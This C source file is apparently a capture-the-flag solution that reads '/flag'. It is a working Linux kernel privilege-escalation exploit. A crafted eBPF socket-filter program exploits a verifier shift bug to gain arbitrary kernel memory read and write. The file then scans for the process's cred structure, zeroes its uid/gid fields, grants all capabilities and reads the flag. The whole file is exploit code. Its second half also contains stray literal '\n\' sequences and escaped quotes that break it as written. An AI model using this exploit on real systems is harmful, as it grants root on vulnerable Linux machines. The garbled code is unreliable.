#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

// Minimal eBPF encoding (uapi/linux/bpf.h compatible enough for our needs)
struct bpf_insn_u64 {
    uint8_t code;
    uint8_t dst_src;
    int16_t off;
    int32_t imm;
} __attribute__((packed));

static inline struct bpf_insn_u64 insn(uint8_t code, uint8_t dst, uint8_t src, int16_t off, int32_t imm) {
    return (struct bpf_insn_u64){.code = code, .dst_src = (uint8_t)((dst & 0xF) | ((src & 0xF) << 4)), .off = off, .imm = imm};
}

enum {
    BPF_LD = 0x00,
    BPF_LDX = 0x01,
    BPF_ST = 0x02,
    BPF_STX = 0x03,
    BPF_ALU = 0x04,
    BPF_JMP = 0x05,
    BPF_ALU64 = 0x07,

    BPF_K = 0x00,
    BPF_X = 0x08,

    BPF_IMM = 0x00,
    BPF_MEM = 0x60,

    BPF_W = 0x00,
    BPF_B = 0x10,
    BPF_DW = 0x18,

    BPF_ADD = 0x00,
    BPF_SUB = 0x10,
    BPF_MUL = 0x20,
    BPF_AND = 0x50,
    BPF_LSH = 0x60,
    BPF_MOV = 0xB0,

    BPF_JA = 0x00,
    BPF_JEQ = 0x10,
    BPF_JNE = 0x50,
    BPF_CALL = 0x80,
    BPF_EXIT = 0x90,
};

enum {
    R0 = 0,
    R1 = 1,
    R2 = 2,
    R3 = 3,
    R4 = 4,
    R5 = 5,
    R6 = 6,
    R7 = 7,
    R8 = 8,
    R9 = 9,
    R10 = 10,
};

static inline struct bpf_insn_u64 MOV64_IMM(uint8_t dst, int32_t imm) {
    return insn(BPF_ALU64 | BPF_MOV | BPF_K, dst, 0, 0, imm);
}
static inline struct bpf_insn_u64 MOV64_REG(uint8_t dst, uint8_t src) {
    return insn(BPF_ALU64 | BPF_MOV | BPF_X, dst, src, 0, 0);
}
static inline struct bpf_insn_u64 ALU64_IMM(uint8_t op, uint8_t dst, int32_t imm) {
    return insn(BPF_ALU64 | op | BPF_K, dst, 0, 0, imm);
}
static inline struct bpf_insn_u64 ALU64_REG(uint8_t op, uint8_t dst, uint8_t src) {
    return insn(BPF_ALU64 | op | BPF_X, dst, src, 0, 0);
}
static inline struct bpf_insn_u64 LDX_MEM(uint8_t size, uint8_t dst, uint8_t src, int16_t off) {
    return insn(BPF_LDX | BPF_MEM | size, dst, src, off, 0);
}
static inline struct bpf_insn_u64 STX_MEM(uint8_t size, uint8_t dst, uint8_t src, int16_t off) {
    return insn(BPF_STX | BPF_MEM | size, dst, src, off, 0);
}
static inline struct bpf_insn_u64 ST_MEM(uint8_t size, uint8_t dst, int16_t off, int32_t imm) {
    return insn(BPF_ST | BPF_MEM | size, dst, 0, off, imm);
}
static inline struct bpf_insn_u64 JMP_IMM(uint8_t op, uint8_t dst, int32_t imm, int16_t off) {
    return insn(BPF_JMP | op | BPF_K, dst, 0, off, imm);
}
static inline struct bpf_insn_u64 JMP_A(int16_t off) {
    return insn(BPF_JMP | BPF_JA, 0, 0, off, 0);
}
static inline struct bpf_insn_u64 CALL_HELPER(int32_t id) {
    return insn(BPF_JMP | BPF_CALL, 0, 0, 0, id);
}
static inline struct bpf_insn_u64 EXIT_INSN(void) {
    return insn(BPF_JMP | BPF_EXIT, 0, 0, 0, 0);
}

enum {
    BPF_PSEUDO_MAP_FD = 1,
};

// bpf() cmd values
enum {
    BPF_MAP_CREATE = 0,
    BPF_MAP_LOOKUP_ELEM = 1,
    BPF_MAP_UPDATE_ELEM = 2,
    BPF_PROG_LOAD = 5,
};

// map/prog types
enum {
    BPF_MAP_TYPE_ARRAY = 2,
    BPF_PROG_TYPE_SOCKET_FILTER = 1,
};

// helper IDs (from uapi mapper)
enum {
    BPF_FUNC_map_lookup_elem = 1,
    BPF_FUNC_skb_load_bytes = 26,
};

// socket constants
enum {
    SO_ATTACH_BPF = 50,
};

// Minimal bpf_attr layouts for the commands we use.
union bpf_attr {
    struct {
        uint32_t map_type;
        uint32_t key_size;
        uint32_t value_size;
        uint32_t max_entries;
        uint32_t map_flags;
        uint32_t inner_map_fd;
        uint32_t numa_node;
        char map_name[16];
        uint32_t map_ifindex;
        uint32_t btf_fd;
        uint32_t btf_key_type_id;
        uint32_t btf_value_type_id;
        uint32_t btf_vmlinux_value_type_id;
    } map_create;
    struct {
        uint32_t prog_type;
        uint32_t insn_cnt;
        uint64_t insns;
        uint64_t license;
        uint32_t log_level;
        uint32_t log_size;
        uint64_t log_buf;
        uint32_t kern_version;
        uint32_t prog_flags;
        char prog_name[16];
    } prog_load;
    struct {
        uint32_t map_fd;
        uint64_t key;
        uint64_t value;
        uint64_t flags;
    } map_elem;
};

static int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size) {
    return (int)syscall(SYS_bpf, cmd, attr, size);
}

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static void emit_ld_map_fd(struct bpf_insn_u64 *prog, size_t *len, uint8_t dst_reg, int map_fd) {
    // LD_IMM64 with src_reg = BPF_PSEUDO_MAP_FD (1)
    prog[(*len)++] = insn(BPF_LD | BPF_IMM | BPF_DW, dst_reg, BPF_PSEUDO_MAP_FD, 0, map_fd);
    prog[(*len)++] = insn(0, 0, 0, 0, 0);
}

static void patch_jump(struct bpf_insn_u64 *prog, size_t jmp_idx, size_t target_idx) {
    int64_t delta = (int64_t)target_idx - (int64_t)jmp_idx - 1;
    if (delta < INT16_MIN || delta > INT16_MAX) {
        fprintf(stderr, "jump delta out of range: %" PRId64 "\n", delta);
        exit(1);
    }
    prog[jmp_idx].off = (int16_t)delta;
}

static void make_exps(uint64_t sum, size_t nterms, uint8_t *out_exps) {
    uint8_t exps[256];
    size_t len = 0;
    for (int b = 0; b < 64; b++) {
        if (sum & (1ULL << b)) {
            exps[len++] = (uint8_t)b;
        }
    }
    // Split highest bits until we reach nterms
    while (len < nterms) {
        size_t idx = 0;
        for (size_t i = 1; i < len; i++) {
            if (exps[i] > exps[idx])
                idx = i;
        }
        if (exps[idx] == 0) {
            fprintf(stderr, "cannot split further (sum=%" PRIu64 ", len=%zu)\n", sum, len);
            exit(1);
        }
        uint8_t v = (uint8_t)(exps[idx] - 1);
        exps[idx] = v;
        exps[len++] = v;
    }
    // We rely on popcount(sum) <= nterms so we never need to merge.
    if (len != nterms) {
        fprintf(stderr, "unexpected len=%zu nterms=%zu\n", len, nterms);
        exit(1);
    }
    memcpy(out_exps, exps, nterms);
}

static bool try_read_flag(void) {
    int fd = open("/flag", O_RDONLY);
    if (fd < 0)
        return false;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    if (n <= 0) {
        close(fd);
        return false;
    }
    buf[n] = 0;
    write(1, buf, (size_t)n);
    write(1, "\\n", 1);
    close(fd);
    return true;
}

enum { PAGE_SZ = 0x1000 };
enum { NTERMS = 32 };

struct __attribute__((packed)) ctrl_pkt {
    uint8_t op;   // 0=read page, 1=write qword
    uint8_t sign; // 0=+, 1=-
    uint8_t exps[NTERMS];
    uint8_t pad[6]; // align write_val at offset 40
    uint64_t write_val;
};

static void build_pkt(struct ctrl_pkt *pkt, uint8_t op, int64_t offset, uint64_t write_val) {
    memset(pkt, 0, sizeof(*pkt));
    pkt->op = op;
    pkt->sign = (offset < 0) ? 1 : 0;
    uint64_t abs_off = (offset < 0) ? (uint64_t)(-offset) : (uint64_t)offset;
    uint64_t sum = abs_off + (uint64_t)NTERMS;
    make_exps(sum, NTERMS, pkt->exps);
    pkt->write_val = write_val;
}

int main(void) {
    // Create array map with 1 entry and 4096-byte value for page transfers.
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_create.map_type = BPF_MAP_TYPE_ARRAY;
    attr.map_create.key_size = 4;
    attr.map_create.value_size = PAGE_SZ;
    attr.map_create.max_entries = 1;
    int map_fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (map_fd < 0)
        die("bpf(map_create)");

    // socketpair for attaching and triggering program
    int fds[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds) != 0)
        die("socketpair");

    // Build eBPF program
    static struct bpf_insn_u64 prog[4096];
    size_t len = 0;

    // r6 = ctx
    prog[len++] = MOV64_REG(R6, R1);
    // *(u32*)(fp-4) = 0
    prog[len++] = ST_MEM(BPF_W, R10, -4, 0);
    // r2 = fp; r2 += -4
    prog[len++] = MOV64_REG(R2, R10);
    prog[len++] = ALU64_IMM(BPF_ADD, R2, -4);
    // r1 = map_fd pseudo
    emit_ld_map_fd(prog, &len, R1, map_fd);
    // call map_lookup_elem
    prog[len++] = CALL_HELPER(BPF_FUNC_map_lookup_elem);
    // if r0 == 0 goto exit
    size_t jmp_map_null = len;
    prog[len++] = JMP_IMM(BPF_JEQ, R0, 0, 0);
    // r7 = r0
    prog[len++] = MOV64_REG(R7, R0);

    // skb_load_bytes(ctx, 0, fp-BUF_OFF, sizeof(pkt))
    const int16_t BUF_OFF = 256;
    prog[len++] = MOV64_REG(R1, R6);
    prog[len++] = MOV64_IMM(R2, 0);
    prog[len++] = MOV64_REG(R3, R10);
    prog[len++] = ALU64_IMM(BPF_ADD, R3, -BUF_OFF);
    prog[len++] = MOV64_IMM(R4, (int32_t)sizeof(struct ctrl_pkt));
    prog[len++] = CALL_HELPER(BPF_FUNC_skb_load_bytes);
    // if r0 != 0 goto exit_set_r0_0
    size_t jmp_skb_fail = len;
    prog[len++] = JMP_IMM(BPF_JNE, R0, 0, 0);

    // r1 = op
    prog[len++] = LDX_MEM(BPF_B, R1, R10, (int16_t)(-BUF_OFF + 0));
    prog[len++] = ALU64_IMM(BPF_AND, R1, 1);
    // r2 = sign
    prog[len++] = LDX_MEM(BPF_B, R2, R10, (int16_t)(-BUF_OFF + 1));
    prog[len++] = ALU64_IMM(BPF_AND, R2, 1);

    // r4 = sum = 0
    prog[len++] = MOV64_IMM(R4, 0);

    // sum loop over exps[]
    for (int i = 0; i < NTERMS; i++) {
        int16_t off = (int16_t)(-BUF_OFF + 2 + i);
        prog[len++] = LDX_MEM(BPF_B, R3, R10, off);           // r3 = exp
        prog[len++] = ALU64_IMM(BPF_AND, R3, 0x3f);           // r3 &= 0x3f
        prog[len++] = MOV64_IMM(R0, 1);                       // r0 = 1
        prog[len++] = ALU64_REG(BPF_LSH, R0, R3);             // r0 <<= r3  (bugged)
        prog[len++] = ALU64_REG(BPF_ADD, R4, R0);             // sum += r0
    }

    // r5 = NTERMS
    prog[len++] = MOV64_IMM(R5, NTERMS);

    // if sign == 0 goto pos_branch
    size_t jmp_sign_is_pos = len;
    prog[len++] = JMP_IMM(BPF_JEQ, R2, 0, 0);
    // neg: r0 = r5 - r4; r4 = r0
    prog[len++] = MOV64_REG(R0, R5);
    prog[len++] = ALU64_REG(BPF_SUB, R0, R4);
    prog[len++] = MOV64_REG(R4, R0);
    // jump to after_sign
    size_t jmp_after_sign = len;
    prog[len++] = JMP_A(0);
    // pos_branch: r4 -= r5
    size_t lbl_pos_branch = len;
    prog[len++] = ALU64_REG(BPF_SUB, R4, R5);
    // after_sign:
    size_t lbl_after_sign = len;

    // r8 = r7 + r4
    prog[len++] = MOV64_REG(R8, R7);
    prog[len++] = ALU64_REG(BPF_ADD, R8, R4);

    // if op == 0 goto read_page
    size_t jmp_op_is_read = len;
    prog[len++] = JMP_IMM(BPF_JEQ, R1, 0, 0);

    // write_qword:
    // r9 = *(u64*)(fp - BUF_OFF + 40)
    const int16_t WRITE_VAL_OFF = (int16_t)(-BUF_OFF + 40);
    prog[len++] = LDX_MEM(BPF_DW, R9, R10, WRITE_VAL_OFF);
    // *(u64*)(r8) = r9
    prog[len++] = STX_MEM(BPF_DW, R8, R9, 0);
    // r0 = 0; exit
    prog[len++] = MOV64_IMM(R0, 0);
    prog[len++] = EXIT_INSN();

    // read_page:
    size_t lbl_read_page = len;
    for (int j = 0; j < PAGE_SZ / 8; j++) {
        int16_t off = (int16_t)(j * 8);
        prog[len++] = LDX_MEM(BPF_DW, R9, R8, off);
        prog[len++] = STX_MEM(BPF_DW, R7, R9, off);
    }
    // exit_set_r0_0:
    size_t lbl_exit_set_r0_0 = len;
    prog[len++] = MOV64_IMM(R0, 0);
    prog[len++] = EXIT_INSN();

    // Patch jump offsets
    patch_jump(prog, jmp_map_null, lbl_exit_set_r0_0);
    patch_jump(prog, jmp_skb_fail, lbl_exit_set_r0_0);
    patch_jump(prog, jmp_sign_is_pos, lbl_pos_branch);
    patch_jump(prog, jmp_after_sign, lbl_after_sign);
    patch_jump(prog, jmp_op_is_read, lbl_read_page);

    if (len > 1000000) {
        fprintf(stderr, "prog too big: %zu insns\\n", len);
        return 1;
    }

    // Load program
    static char log_buf[1 << 16];
    memset(&attr, 0, sizeof(attr));
    attr.prog_load.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.prog_load.insn_cnt = (uint32_t)len;
    attr.prog_load.insns = (uint64_t)(uintptr_t)prog;
    static const char license[] = "GPL";
    attr.prog_load.license = (uint64_t)(uintptr_t)license;
    attr.prog_load.log_level = 1;
    attr.prog_load.log_size = sizeof(log_buf);
    attr.prog_load.log_buf = (uint64_t)(uintptr_t)log_buf;

    int prog_fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0) {
        fprintf(stderr, "bpf(prog_load) failed: %s\\n", strerror(errno));\n\
        write(2, log_buf, strnlen(log_buf, sizeof(log_buf)));\n\
        write(2, \"\\n\", 1);\n\
        return 1;\n\
    }

    // Attach program to socket fds[1]
    if (setsockopt(fds[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0)
        die("setsockopt(SO_ATTACH_BPF)");

    uint8_t page[PAGE_SZ];
    struct ctrl_pkt pkt;

    // Pattern: 8x uid/gid fields == 1000 (0x3e8)
    uint8_t pat[32];
    for (int i = 0; i < 8; i++) {
        uint32_t v = 1000;\n\
        memcpy(pat + i * 4, &v, 4);\n\
    }

    // Scan +/- RANGE around base in page steps
    const int64_t RANGE = 32LL * 1024 * 1024; // 32MB each direction
    const int64_t STEP = PAGE_SZ;

    uint32_t key0 = 0;
    static uint8_t map_out[PAGE_SZ];

    for (int64_t delta = 0; delta <= RANGE; delta += STEP) {
        for (int s = 0; s < 2; s++) {
            int64_t off = (s == 0) ? delta : -delta;
            if (off == 0 && s == 1)
                continue;

            build_pkt(&pkt, 0, off, 0);\n\
            if (write(fds[0], &pkt, sizeof(pkt)) != (ssize_t)sizeof(pkt))\n\
                die(\"write(trigger)\");\n\
\n\
            // lookup map value into map_out\n\
            memset(&attr, 0, sizeof(attr));\n\
            attr.map_elem.map_fd = (uint32_t)map_fd;\n\
            attr.map_elem.key = (uint64_t)(uintptr_t)&key0;\n\
            attr.map_elem.value = (uint64_t)(uintptr_t)map_out;\n\
            if (bpf_syscall(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)) != 0)\n\
                die(\"bpf(map_lookup)\");\n\
\n\
            // search for cred uid/gid pattern\n\
            for (size_t pos = 0; pos + sizeof(pat) <= PAGE_SZ; pos++) {\n\
                if (memcmp(map_out + pos, pat, sizeof(pat)) != 0)\n\
                    continue;\n\
\n\
                int64_t uid_off = off + (int64_t)pos;\n\
                int64_t cred_start_off = uid_off - 8;\n\
\n\
                // Patch IDs (4 qwords)\n\
                for (int i = 0; i < 4; i++) {\n\
                    build_pkt(&pkt, 1, uid_off + (int64_t)(i * 8), 0);\n\
                    if (write(fds[0], &pkt, sizeof(pkt)) != (ssize_t)sizeof(pkt))\n\
                        die(\"write(patch ids)\");\n\
                }\n\
                // Patch caps: set everything to all 1s for safety\n\
                const uint64_t ALL = 0xffffffffffffffffULL;\n\
                int64_t cap_inh = cred_start_off + 48;\n\
                int64_t cap_perm = cred_start_off + 56;\n\
                int64_t cap_eff = cred_start_off + 64;\n\
                int64_t cap_bset = cred_start_off + 72;\n\
                int64_t cap_amb = cred_start_off + 80;\n\
                int64_t cap_offs[] = {cap_inh, cap_perm, cap_eff, cap_bset, cap_amb};\n\
                for (size_t i = 0; i < sizeof(cap_offs) / sizeof(cap_offs[0]); i++) {\n\
                    build_pkt(&pkt, 1, cap_offs[i], ALL);\n\
                    if (write(fds[0], &pkt, sizeof(pkt)) != (ssize_t)sizeof(pkt))\n\
                        die(\"write(patch caps)\");\n\
                }\n\
\n\
                if (try_read_flag())\n\
                    return 0;\n\
            }\n\
        }\n\
    }\n\
\n\
    fprintf(stderr, \"failed to find/patch creds in scan window\\n\");\n\
    return 1;\n\
}\n+
